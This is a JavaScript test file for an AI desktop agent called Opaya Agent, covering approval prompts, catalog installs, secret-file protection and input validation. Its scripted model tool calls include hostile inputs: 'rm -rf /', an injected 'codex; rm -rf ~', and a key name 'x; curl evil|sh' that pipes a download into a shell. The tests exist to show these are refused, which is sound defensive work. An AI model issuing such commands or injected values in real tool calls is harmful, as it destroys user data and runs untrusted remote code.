'use strict';
const {test}=require('node:test');const assert=require('node:assert/strict');const fs=require('node:fs/promises');const path=require('node:path');
const {Broker}=require('../desktop/broker.cjs');const {Store,Vault}=require('../desktop/store.cjs');const {OpayaAgent}=require('../desktop/opaya-agent.cjs');const catalog=require('../desktop/catalog.cjs');const {temp,secure,childMock}=require('./helpers.cjs');
const apiAgent=(name,port)=>({name,provider:'hermes',protocol:'openai',transport:'http',endpoint:`http://127.0.0.1:${port}/v1`,model:'hermes-agent'});
// A scripted OpenAI-compatible endpoint: each call returns the next scripted assistant message.
function model(script){const requests=[];return {requests,fetch:async(url,init)=>{requests.push({url,body:init.body?JSON.parse(init.body):null,headers:init.headers});const message=script.shift()||{content:'done'};return {ok:true,status:200,json:async()=>url.endsWith('/models')?{data:[{id:'m1'}]}:{choices:[{message}]}};}};}
const call=(name,args={})=>({content:'',tool_calls:[{id:'c'+Math.random(),type:'function',function:{name,arguments:JSON.stringify(args)}}]});
async function fixture(t,script,{allow=true,trusted=false}={}){
  const root=await temp(t),approvals=[],commands=[];
  const approve=async(_a,title,detail)=>{approvals.push({title,detail});return allow;};
  const broker=new Broker({store:new Store(root),vault:new Vault(root,secure()),emit:()=>{},approve,adapterFactory:()=>({connect:async()=>({}),close(){},run:async()=>({})})});await broker.init();t.after(()=>broker.close());
  const terminals={describe:()=>[],attach:id=>({id,buffer:'installed ok',exited:true}),closeAgent(){}};
  const m=model(script);
  const agent=new OpayaAgent({root,vault:broker.vault,broker,terminals,approve,emit:()=>{},runInTerminal:async x=>{commands.push(x);return {id:'term1'};},fetchImpl:m.fetch,trusted:()=>trusted});
  await agent.init();await agent.saveConfig({preset:'ollama',model:'m1'});
  return {root,agent,broker,approvals,commands,requests:m.requests};
}
const settle=async agent=>{for(let i=0;i<2000&&agent.busy;i++)await new Promise(r=>setTimeout(r,5));assert.equal(agent.busy,false);};
test('Opaya Agent answers through tools and shows one reply per request',async t=>{
  const {agent,broker,requests}=await fixture(t,[call('get_workspace'),{content:'You have one agent.'}]);
  await broker.saveAgent({agent:apiAgent('one',8642)});
  agent.begin('What do I have?');await settle(agent);
  const shown=agent.describe().messages;assert.deepEqual(shown.map(m=>m.role),['user','assistant']);assert.equal(shown[1].content,'You have one agent.');assert.deepEqual(shown[1].activity,['Using get workspace']);
  const toolResult=requests[1].body.messages.find(m=>m.role==='tool');assert.match(toolResult.content,/"name":"one"/);
  assert.equal(requests[0].body.tools.some(t=>t.function.name==='save_connection'),true);
});
test('Opaya Agent uses the local Codex app-server and exposes live tool activity',async t=>{
  const root=await temp(t),broker=new Broker({store:new Store(root),vault:new Vault(root,secure()),emit:()=>{},approve:async()=>true,adapterFactory:()=>({connect:async()=>({}),close(){}})});await broker.init();
  const child=childMock((m,c)=>{
    if(m.method==='initialize')c.reply(m,{});
    if(m.method==='model/list')c.reply(m,{data:[{model:'gpt-local'}]});
    if(m.method==='thread/start'){assert.equal(m.params.sandbox,'read-only');assert.equal(m.params.approvalPolicy,'never');assert.equal(m.params.dynamicTools.some(x=>x.name==='get_workspace'),true);c.reply(m,{thread:{id:'opaya-thread'}});}
    if(m.method==='turn/start'){c.reply(m,{turn:{id:'opaya-turn'}});c.send({method:'turn/started',params:{threadId:'opaya-thread',turn:{id:'opaya-turn'}}});c.send({id:77,method:'item/tool/call',params:{threadId:'opaya-thread',turnId:'opaya-turn',callId:'call-1',tool:'get_workspace',arguments:{}}});}
    if(m.id===77&&!m.method){assert.equal(m.result.success,true);c.send({method:'item/agentMessage/delta',params:{threadId:'opaya-thread',itemId:'answer',delta:'Local Codex works.'}});c.send({method:'turn/completed',params:{threadId:'opaya-thread',turn:{id:'opaya-turn',status:'completed'}}});}
  });
  const agent=new OpayaAgent({root,vault:broker.vault,broker,terminals:{describe:()=>[]},approve:async()=>true,emit:()=>{},runInTerminal:async()=>({id:'x'}),spawnAgent:()=>child});await agent.init();await agent.saveConfig({preset:'codex',model:''});
  t.after(async()=>{await agent.close();await broker.close();});
  assert.deepEqual((await agent.test({preset:'codex'})).models,['gpt-local']);agent.begin('Inspect my workspace');await settle(agent);
  const answer=agent.describe().messages.at(-1);assert.equal(answer.content,'Local Codex works.');assert.deepEqual(answer.activity,['Using get workspace']);
});
test('Opaya Agent changes connections only after approval and never stores tokens it is given',async t=>{
  const {agent,broker,approvals}=await fixture(t,[call('save_connection',{connection:{...apiAgent('added',8650),token:'secret-token'}}),{content:'Added.'}]);
  agent.begin('Add my gateway');await settle(agent);
  assert.equal(approvals.length,1);assert.match(approvals[0].title,/Add connection "added"/);assert(!approvals[0].detail.includes('secret-token'));
  assert.equal(broker.data.agents[0].name,'added');assert.equal(broker.vault.has(broker.data.agents[0].id),false);
});
test('declined approvals stop changes and installs; unknown tools and bad input are refused',async t=>{
  const {agent,broker,commands,requests}=await fixture(t,[call('save_machine',{machine:{alias:'vps'}}),call('install_framework',{framework_id:'codex'}),call('run_shell',{command:'rm -rf /'}),call('install_framework',{framework_id:'codex; rm -rf ~'}),{content:'ok'}],{allow:false});
  agent.begin('set things up');await settle(agent);
  assert.equal(broker.data.hosts.length,0);assert.equal(commands.length,0);
  const results=requests.at(-1).body.messages.filter(m=>m.role==='tool').map(m=>JSON.parse(m.content).error);
  assert.match(results[0],/declined/);assert.match(results[1],/declined/);assert.match(results[2],/Unknown tool/);assert.match(results[3],/Unknown agent framework/);
});
test('approved installs run the fixed catalog command in a visible terminal',async t=>{
  const {agent,commands,approvals}=await fixture(t,[call('install_framework',{framework_id:'codex'}),{content:'Installing.'}]);
  agent.begin('install codex');await settle(agent);
  assert.equal(commands.length,1);assert.equal(commands[0].command,catalog.command('codex',{remote:false}).command);assert.equal(commands[0].host,null);assert.match(approvals[0].detail,/npm install -g @openai\/codex/);
});
test('notes stay inside the agent home folder and model endpoints follow the same rules as agents',async t=>{
  const {agent,root}=await fixture(t,[call('write_notes',{content:'Hermes runs on vps.'}),{content:'Saved.'}]);
  agent.begin('remember');await settle(agent);
  assert.equal(await fs.readFile(path.join(root,'opaya-agent','notes.md'),'utf8'),'Hermes runs on vps.');
  await assert.rejects(()=>agent.saveConfig({preset:'custom',baseUrl:'http://example.com/v1',model:'x'}),/HTTPS|plain|loopback|public/i);
  await assert.rejects(()=>agent.saveConfig({preset:'nope',model:'x'}),/Unknown model provider/);
  assert.throws(()=>new OpayaAgent({root,vault:null,broker:null,terminals:null}).begin('x'),/Connect the Opaya Agent/);
});
test('ssh key actions reject names that could inject shell syntax',async t=>{
  const {agent,commands,requests}=await fixture(t,[call('ssh_key',{action:'generate',key_name:'x; curl evil|sh'}),{content:'no'}]);
  agent.begin('make a key');await settle(agent);
  assert.equal(commands.length,0);assert.match(JSON.parse(requests.at(-1).body.messages.find(m=>m.role==='tool').content).error,/key name/);
});
test('the Opaya Agent can read project files but never secret files',async t=>{
  const dir=await temp(t);await fs.writeFile(path.join(dir,'README.md'),'hello project');await fs.writeFile(path.join(dir,'.env'),'API_KEY=sk-live-secret');
  const {agent,requests}=await fixture(t,[call('read_file',{path:path.join(dir,'README.md')}),call('read_file',{path:path.join(dir,'.env')}),call('list_directory',{path:dir}),{content:'ok'}]);
  agent.begin('look at my project');await settle(agent);
  const results=requests.at(-1).body.messages.filter(m=>m.role==='tool').map(m=>JSON.parse(m.content));
  assert.equal(results[0].text,'hello project');assert.match(results[1].error,/secrets/);assert(!JSON.stringify(requests).includes('sk-live-secret'));
  assert.deepEqual(results[2].entries.map(e=>e.name).sort(),['.env','README.md']);
});
test('dependencies and the essentials bundle are installable through the same approved catalog path',async t=>{
  const {agent,commands,approvals}=await fixture(t,[call('install_framework',{framework_id:'essentials'}),call('install_framework',{framework_id:'node'}),{content:'done'}]);
  agent.begin('install everything I need');await settle(agent);
  assert.equal(commands.length,2);assert.equal(commands[0].command,catalog.command('essentials',{remote:false}).command);assert.match(commands[1].command,/node/);assert.equal(approvals.length,2);
  const kinds=new Set(catalog.list().map(f=>f.kind));assert.deepEqual([...kinds].sort(),['agent','bundle','dependency']);
});
test('iTrust lets the Opaya Agent act without asking, but removals still ask',async t=>{
  const {agent,broker,commands,approvals}=await fixture(t,[call('install_framework',{framework_id:'codex'}),call('get_workspace'),{content:'ok'}],{allow:false,trusted:true});
  await broker.saveAgent({agent:apiAgent('keep',8660)});
  agent.begin('install codex');await settle(agent);
  assert.equal(commands.length,1);assert.equal(approvals.length,0);assert(agent.describe().messages.at(-1).activity.some(x=>/iTrust approved: Install Codex CLI/.test(x)));
  const {agent:a2,broker:b2,approvals:ap2}=await fixture(t,[call('remove_connection',{agent_id:'keep-me'}),{content:'ok'}],{allow:false,trusted:true});
  await b2.saveAgent({agent:{...apiAgent('keep',8661),id:'keep-me'}});
  a2.begin('remove it');await settle(a2);
  assert.equal(ap2.length,1);assert.match(ap2[0].title,/Remove connection/);assert.equal(b2.data.agents.length,1,'declined removal keeps the agent');
});
